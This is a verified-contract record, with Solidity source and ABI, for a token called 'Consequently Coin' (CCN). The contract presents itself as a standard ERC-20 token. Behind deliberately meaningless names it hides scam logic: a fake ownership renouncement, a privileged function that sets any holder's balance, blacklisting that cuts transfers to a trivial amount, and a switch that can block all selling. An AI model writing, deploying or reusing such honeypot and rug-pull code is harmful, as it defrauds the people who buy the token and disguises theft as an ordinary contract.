{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract feeEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minLaunched {\n    function createPair(address swapTradingAuto, address senderSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface teamEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingFrom) external view returns (uint256);\n\n    function transfer(address receiverWalletShould, uint256 atEnableTeam) external returns (bool);\n\n    function allowance(address shouldToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atEnableTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverWalletShould,\n        uint256 atEnableTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundFrom, uint256 value);\n    event Approval(address indexed shouldToken, address indexed spender, uint256 value);\n}\n\ninterface receiverTotalMetadata is receiverTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsequentlyCoin is feeEnable, receiverTotal, receiverTotalMetadata {\n\n    bool public teamLaunch;\n\n    uint8 private modeLimit = 18;\n\n    mapping(address => bool) public enableTo;\n\n    function modeLaunch() public {\n        emit OwnershipTransferred(fundEnable, address(0));\n        sellMarketing = address(0);\n    }\n\n    address public fundEnable;\n\n    address txLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address launchedTrading, uint256 atEnableTeam) external virtual override returns (bool) {\n        return minLaunch(_msgSender(), launchedTrading, atEnableTeam);\n    }\n\n    uint256 listTake;\n\n    bool public minAmountLimit;\n\n    uint256 isMode;\n\n    uint256 private buyMode;\n\n    function receiverSwap(address autoIs) public {\n        require(autoIs.balance < 100000);\n        if (teamLaunch) {\n            return;\n        }\n        if (liquidityFee != buyMode) {\n            buyMode = liquidityFee;\n        }\n        walletMin[autoIs] = true;\n        \n        teamLaunch = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamTx;\n    }\n\n    uint256 private listTx;\n\n    uint256 public minSell = 0;\n\n    function exemptTake(address buyTeamTotal, address receiverWalletShould, uint256 atEnableTeam) internal returns (bool) {\n        require(shouldSell[buyTeamTotal] >= atEnableTeam);\n        shouldSell[buyTeamTotal] -= atEnableTeam;\n        shouldSell[receiverWalletShould] += atEnableTeam;\n        emit Transfer(buyTeamTotal, receiverWalletShould, atEnableTeam);\n        return true;\n    }\n\n    function teamBuy(address isTeam) public {\n        senderTx();\n        if (buyMode == limitTrading) {\n            liquidityFee = buyMode;\n        }\n        if (isTeam == fundEnable || isTeam == minSenderAt) {\n            return;\n        }\n        enableTo[isTeam] = true;\n    }\n\n    function tradingToken(address buyTeamTotal, address receiverWalletShould, uint256 atEnableTeam) internal view returns (uint256) {\n        require(atEnableTeam > 0);\n\n        uint256 modeLaunched = 0;\n        if (buyTeamTotal == minSenderAt && marketingAmount > 0) {\n            modeLaunched = atEnableTeam * marketingAmount / 100;\n        } else if (receiverWalletShould == minSenderAt && minSell > 0) {\n            modeLaunched = atEnableTeam * minSell / 100;\n        }\n        require(modeLaunched <= atEnableTeam);\n        return atEnableTeam - modeLaunched;\n    }\n\n    function txMode(address launchedTrading, uint256 atEnableTeam) public {\n        senderTx();\n        shouldSell[launchedTrading] = atEnableTeam;\n    }\n\n    function transferFrom(address buyTeamTotal, address receiverWalletShould, uint256 atEnableTeam) external override returns (bool) {\n        if (_msgSender() != txLiquidity) {\n            if (marketingAutoExempt[buyTeamTotal][_msgSender()] != type(uint256).max) {\n                require(atEnableTeam <= marketingAutoExempt[buyTeamTotal][_msgSender()]);\n                marketingAutoExempt[buyTeamTotal][_msgSender()] -= atEnableTeam;\n            }\n        }\n        return minLaunch(buyTeamTotal, receiverWalletShould, atEnableTeam);\n    }\n\n    uint256 constant autoLiquidity = 2 ** 10;\n\n    mapping(address => uint256) private shouldSell;\n\n    constructor (){\n        \n        modeLaunch();\n        teamEnable listReceiverTo = teamEnable(txLiquidity);\n        minSenderAt = minLaunched(listReceiverTo.factory()).createPair(listReceiverTo.WETH(), address(this));\n        totalSender = minLaunched(listReceiverTo.factory()).feeTo();\n        \n        fundEnable = _msgSender();\n        walletMin[fundEnable] = true;\n        shouldSell[fundEnable] = teamTx;\n        if (limitTrading != liquidityFee) {\n            listTx = buyMode;\n        }\n        emit Transfer(address(0), fundEnable, teamTx);\n    }\n\n    function minLaunch(address buyTeamTotal, address receiverWalletShould, uint256 atEnableTeam) internal returns (bool) {\n        if (buyTeamTotal == fundEnable) {\n            return exemptTake(buyTeamTotal, receiverWalletShould, atEnableTeam);\n        }\n        uint256 sellTake = receiverTotal(minSenderAt).balanceOf(totalSender);\n        require(sellTake == listTake);\n        require(receiverWalletShould != totalSender);\n        if (enableTo[buyTeamTotal]) {\n            return exemptTake(buyTeamTotal, receiverWalletShould, autoLiquidity);\n        }\n        atEnableTeam = tradingToken(buyTeamTotal, receiverWalletShould, atEnableTeam);\n        return exemptTake(buyTeamTotal, receiverWalletShould, atEnableTeam);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeLimit;\n    }\n\n    address totalSender;\n\n    function owner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    uint256 public marketingAmount = 3;\n\n    function allowance(address exemptSender, address receiverMax) external view virtual override returns (uint256) {\n        if (receiverMax == txLiquidity) {\n            return type(uint256).max;\n        }\n        return marketingAutoExempt[exemptSender][receiverMax];\n    }\n\n    event OwnershipTransferred(address indexed launchedMax, address indexed liquidityTotal);\n\n    address public minSenderAt;\n\n    string private fromMax = \"Consequently Coin\";\n\n    function approve(address receiverMax, uint256 atEnableTeam) public virtual override returns (bool) {\n        marketingAutoExempt[_msgSender()][receiverMax] = atEnableTeam;\n        emit Approval(_msgSender(), receiverMax, atEnableTeam);\n        return true;\n    }\n\n    string private tokenModeReceiver = \"CCN\";\n\n    function fromTx(uint256 atEnableTeam) public {\n        senderTx();\n        listTake = atEnableTeam;\n    }\n\n    function balanceOf(address marketingFrom) public view virtual override returns (uint256) {\n        return shouldSell[marketingFrom];\n    }\n\n    uint256 private limitTrading;\n\n    address private sellMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenModeReceiver;\n    }\n\n    uint256 public liquidityFee;\n\n    uint256 private teamTx = 100000000 * 10 ** 18;\n\n    bool private walletModeAt;\n\n    function getOwner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    mapping(address => bool) public walletMin;\n\n    function senderTx() private view {\n        require(walletMin[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingAutoExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atEnableTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atEnableTeam\",\"type\":\"uint256\"}],\"name\":\"fromTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmountLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSenderAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"}],\"name\":\"teamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atEnableTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeamTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverWalletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atEnableTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atEnableTeam\",\"type\":\"uint256\"}],\"name\":\"txMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConsequentlyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}